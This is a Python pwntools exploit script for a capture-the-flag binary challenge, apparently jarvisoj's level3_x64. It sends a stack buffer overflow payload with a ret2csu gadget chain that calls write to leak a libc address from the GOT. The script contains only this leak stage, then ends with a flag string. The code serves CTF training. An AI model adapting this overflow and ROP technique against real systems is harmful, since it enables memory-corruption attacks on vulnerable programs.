#!
#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
@author: starvii
如果依赖特定版本的libc，请使用patchelf对可执行文件修改
例如，使用x64的2.23版本的libc，

patchelf --set-interpreter /glibc/2.23/64/lib/ld-linux-x86-64.so.2 <binary>
patchelf --replace-needed libc.so.6 /glibc/2.23/64/lib/libc.so.6 <binary>

"""

import sys
from os import path
from pwn import *
from pwnlib import gdb

context(arch="amd64", os="linux", log_level="debug")

elf_name = path.join(path.dirname(path.abspath(__file__)), "level3_x64_patched")
_, host, port = "nc pwn2.jarvisoj.com 9883".split(" ")

elf = ELF(elf_name)
io = remote(host, port) if len(sys.argv) > 1 else process(elf_name)


def exp_x64_csu_init(
    pop_rbx_addr: int,
    ret_addr: int,
    p_func_addr:int,
    arg1:int,
    arg2:int,
    arg3:int
):
    """
    仅适用于：
        1. 三个参数以内函数
        2. 溢出空间较大（> 120 bytes）
        3. 第一个参数较小，例如write和read等
    """
    import struct
    return b"".join([
        struct.pack("<Q", pop_rbx_addr),
        struct.pack("<Q", 0),  # pop     rbx
        struct.pack("<Q", 1),  # pop     rbp
        struct.pack("<Q", p_func_addr),  # pop     r12; call    qword ptr [r12+rbx*8]
        struct.pack("<Q", arg3),  # pop     r13; mov     rdx, r13
        struct.pack("<Q", arg2),  # pop     r14; mov     rsi, r14
        struct.pack("<Q", arg1),  # pop     r15; mov     edi, r15d
        7 * struct.pack("<Q", 0xcafebeefdeadface),
        struct.pack("<Q", ret_addr),
    ])


def main():
    io.recvuntil("\n")
    POP_RBX = 0x4006AA  # => RDX
    payload = b"@" * (0x80 + 8) + exp_x64_csu_init(
        POP_RBX,
        elf.sym["_start"],
        elf.got["write"],
        1, elf.got["write"], 8
    )
    io.send(payload)
    io.interactive()

if __name__ == "__main__":
    main()

# CTF{081ecc7c8d658409eb43358dcc1cf446}